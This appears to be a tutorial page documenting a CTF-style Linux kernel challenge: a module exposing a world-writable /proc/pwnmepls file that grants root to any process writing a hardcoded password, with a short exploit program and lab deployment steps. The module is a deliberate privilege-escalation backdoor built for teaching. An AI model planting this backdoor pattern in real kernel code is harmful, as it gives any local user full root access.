#metadata(
  (
    title: "Procfs Rooting Challenge",
    description: "Documentation of a kernel challenge that provides a rooting primitive via procfs.",
    date: "2026-01-05",
    order: 7,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Procfs Rooting Challenge: Escalating Privileges

This challenge builds upon basic procfs interaction by introducing kernel-space privilege escalation. Instead of just revealing a flag, the kernel module modifies the credentials of the process interacting with it.

== The Driver Code

The module creates `/proc/pwnmepls`. When the correct password is written to it, the module grants root privileges to the writing process.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/string.h>

#define PROC_FILENAME "pwnmepls"
#define PASSWORD "uiiaiiuuiiai"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fitrafep");
MODULE_DESCRIPTION("Procfs Rooting Challenge");

static struct proc_dir_entry *proc_entry;
static int authenticated = 0;

static ssize_t device_write(struct file *filp, const char __user *buff, size_t len, loff_t *off)
{
    char input[32];
    size_t pass_len = strlen(PASSWORD);

    if (len > sizeof(input) - 1)
        return -EINVAL;

    if (copy_from_user(input, buff, len))
        return -EFAULT;

    input[len] = '\0';

    if (len >= pass_len && strncmp(input, PASSWORD, pass_len) == 0) {
        authenticated = 1;
        commit_creds(prepare_kernel_cred(NULL));
        printk(KERN_INFO "secret_chall: Correct password! Root privileges granted.\n");
    } else {
        authenticated = 0;
        printk(KERN_INFO "secret_chall: Incorrect password.\n");
    }

    return len;
}

#ifdef HAVE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_write = device_write,
};
#else
static const struct file_operations proc_fops = {
    .write = device_write,
};
#endif

static int __init secret_chall_init(void)
{
    proc_entry = proc_create(PROC_FILENAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        return -ENOMEM;
    }
    return 0;
}

static void __exit secret_chall_exit(void)
{
    if (proc_entry)
        proc_remove(proc_entry);
}

module_init(secret_chall_init);
module_exit(secret_chall_exit);
```

== Makefile

```makefile
obj-m += secret_chall.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

== The Rooting Primitive

The core of the privilege escalation happens in a single line:

```c
commit_creds(prepare_kernel_cred(NULL));
```

This is the classic way to gain root privileges in kernel exploits:

- *`prepare_kernel_cred(NULL)`*: This kernel function allocates a new `struct cred` (credential structure). When passed `NULL`, it initializes this structure with the default "kernel" credentials, which are effectively UID 0, GID 0 (root) with all capabilities.
- *`commit_creds(...)`*: This function takes a `struct cred` and applies it to the currently executing task (the process that called `write()`).

Once this line executes, the calling process immediately gains full root privileges.

== Exploit Script (C)

This script verifies the privilege escalation by checking its UID before and after interacting with the proc entry.

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // 1. Write the secret password
    int fd = open("/proc/pwnmepls", O_WRONLY);
    if (fd < 0) { perror("open write"); return 1; }

    const char *password = "uiiaiiuuiiai";
    write(fd, password, strlen(password));
    close(fd);

    // 2. Verify root escalation
    if (getuid() == 0) {
        printf("[+] Success! We are root.\n");
        system("id");
    } else {
        printf("[-] Failed to get root.\n");
    }

    return 0;
}
```

== Deployment

This challenge is run as a non-privileged user to demonstrate escalation. The `init` script loads the module and then drops privileges to run the exploit.

```diff
-exec /bin/sh
+insmod /secret_chall.ko
+su pwn -c "/exploit_secret"
+poweroff -f
```

The challenge source code should be placed in the `src/` folder and the exploit in the `exploit/` folder of the #link("https://github.com/fepfitra/kernel-pwn-minimal")[orchestrator repo].

Finally, rebuild the rootfs and launch the environment:

```bash
./pack.sh && ./run.sh
```